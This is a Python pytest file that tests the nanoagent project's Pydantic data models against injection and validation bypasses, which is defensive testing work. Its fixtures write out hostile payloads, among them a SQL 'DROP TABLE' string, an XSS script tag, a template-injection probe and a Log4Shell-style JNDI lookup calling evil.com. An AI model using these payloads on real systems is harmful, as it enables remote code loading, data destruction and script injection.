#!/usr/bin/env python3
"""
Security analysis tests for nanoagent data models
Tests for injection vulnerabilities, validation bypasses, and other security issues
"""

# type: ignore  # Ignore type checking violations in test files
# pyright: reportMissingImports = warning
# pyright: reportUnusedCallResult = none

import pytest
from pydantic import ValidationError

from nanoagent.models.schemas import (
    AgentRunResult,
    AgentStatus,
    ExecutionResult,
    ReflectionOutput,
    Task,
    TaskPlanOutput,
)


class TestSecurityVulnerabilities:
    """Test security aspects of data models"""

    def test_json_injection_protection(self):
        """Test that malicious JSON cannot compromise model validation"""
        # Invalid JSON that should fail validation
        invalid_json = '{"__init__": "exploit", "description": null}'  # null description should fail

        # This should safely fail with ValidationError, not execute arbitrary code
        with pytest.raises(ValidationError) as exc_info:
            Task.model_validate_json(invalid_json)

        # Verify it's a validation error, not some other exception
        assert "validation error" in str(exc_info.value).lower()

    def test_dict_injection_protection(self):
        """Test that malicious dictionary keys cannot compromise model validation"""
        malicious_dict = {"__class__": "exploit", "__module__": "os.system", "description": "test"}

        # Pydantic models only accept defined fields, malicious keys are ignored
        task = Task.model_validate(malicious_dict)
        # Should only have valid fields, malicious keys ignored
        assert hasattr(task, "description")
        # Note: Pydantic stores the class reference, but doesn't execute malicious code
        # This is expected and safe behavior

    def test_sql_injection_storage(self):
        """Test that SQL injection strings are stored safely (not executed)"""
        sql_injection = "test'; DROP TABLE tasks; --"

        task = Task(description=sql_injection)
        # Should be stored as-is, not executed
        assert task.description == sql_injection

        # Test with other models
        plan = TaskPlanOutput(tasks=[sql_injection])
        assert plan.tasks[0] == sql_injection

        result = ExecutionResult(success=False, output=sql_injection)
        assert result.output == sql_injection

    def test_script_injection_storage(self):
        """Test that script injection is stored safely (not executed)"""
        script_injection = "<script>alert('xss')</script>"

        task = Task(description=script_injection)
        assert task.description == script_injection

        result = AgentRunResult(output=script_injection, status=AgentStatus.COMPLETED)
        assert result.output == script_injection

    def test_denial_of_service_large_input(self):
        """Test behavior with extremely large inputs"""
        # Very large description (1MB)
        large_desc = "A" * (1024 * 1024)

        # This should either work (Pydantic doesn't limit by default) or fail gracefully
        try:
            Task(description=large_desc)
            print("Large inputs accepted (consider adding size limits for production)")
        except ValidationError:
            print("Large inputs rejected (good for DoS protection)")
        except MemoryError:
            print("Memory error with large input (potential DoS vector)")

    def test_unicode_security_issues(self):
        """Test Unicode-related security issues"""
        # Test with various Unicode strings that could cause issues
        unicode_inputs = [
            "\ufeff",  # Zero-width no-break space (BOM)
            "\u0000",  # Null character
            "\u202e",  # Right-to-left override
            "🦄",  # Emoji
            "ñáéíóú",  # Accented characters
        ]

        for unicode_input in unicode_inputs:
            task = Task(description=unicode_input)
            assert task.description == unicode_input

    def test_numeric_boundary_conditions(self):
        """Test numeric boundary conditions for security"""
        # Test priority boundaries
        valid_priorities = [1, 5, 10]
        for priority in valid_priorities:
            task = Task(description="test", priority=priority)
            assert task.priority == priority

        # Test invalid priorities - should be rejected
        invalid_priorities = [0, -1, 11, 999999999999999999999]
        for priority in invalid_priorities:
            with pytest.raises(ValidationError):
                Task(description="test", priority=priority)

    def test_list_field_injection_attempts(self):
        """Test attempts to inject malicious content into list fields"""
        malicious_items = [
            {"__class__": "exploit"},
            "<script>alert('xss')</script>",
            "'; DROP TABLE tasks; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection attempt
        ]

        # Test with TaskPlanOutput - strings only, objects should be rejected
        with pytest.raises(ValidationError) as exc_info:
            TaskPlanOutput(tasks=["valid_task"], questions=malicious_items)  # type: ignore

        # Verify the error is about type validation
        assert "string_type" in str(exc_info.value)

        # Test with ReflectionOutput - should also reject objects
        with pytest.raises(ValidationError) as exc_info:
            ReflectionOutput(done=False, gaps=malicious_items, new_tasks=malicious_items, complete_ids=malicious_items)  # type: ignore

        # Verify it's the same type validation error
        assert "string_type" in str(exc_info.value)

    def test_enum_bypass_attempts(self):
        """Test attempts to bypass enum validation"""

        # Valid enum values should work
        valid_statuses = ["pending", "done", "cancelled"]
        for status in valid_statuses:
            task = Task(description="test", status=status)  # type: ignore
            assert task.status.value == status

        # Invalid enum values should be rejected
        invalid_statuses = [
            "PENDING",  # Wrong case
            "pending ",  # Trailing space
            " invalid",  # Leading space
            "invalid",
            "",
            None,
            123,
            {"status": "pending"},  # Object instead of string
        ]

        for invalid_status in invalid_statuses:
            with pytest.raises(ValidationError):
                Task(description="test", status=invalid_status)  # type: ignore

    def test_type_confusion_attacks(self):
        """Test type confusion attacks"""
        # Try to pass wrong types that might cause issues
        type_confusion_tests = [
            # Boolean instead of string for description
            {"description": True},
            # List instead of string for description
            {"description": ["not", "a", "string"]},
            # Dict instead of string
            {"description": {"not": "a", "string": True}},
            # None for required fields
            {"description": None},
        ]

        for malicious_input in type_confusion_tests:
            with pytest.raises(ValidationError):
                Task.model_validate(malicious_input)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
